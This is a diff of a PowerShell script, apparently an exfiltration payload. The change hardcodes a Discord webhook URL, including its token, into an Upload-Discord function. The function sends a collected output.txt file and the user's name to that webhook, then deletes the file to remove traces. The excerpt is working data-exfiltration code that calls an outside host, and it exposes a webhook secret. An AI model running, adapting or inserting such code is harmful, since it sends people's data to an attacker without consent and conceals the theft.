@@ -30,7 +30,7 @@ function Upload-Discord {
         [string]$text 
     )
 
-    $hookurl = "$dc"
+    $hookurl = "https://discord.com/api/webhooks/1436503696732061717/bbolG_DZzKud2HDkXHQDUOA33EBf3JZBzB8qMTAk22FOxjMQHQDHhjJO9DIdnQgM3dax"
 
     $Body = @{
         'username' = $env:username
@@ -45,6 +45,7 @@ function Upload-Discord {
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))) { Upload-Discord -file $dir\output.txt }
+
 
 
 RI $dir/output.txt
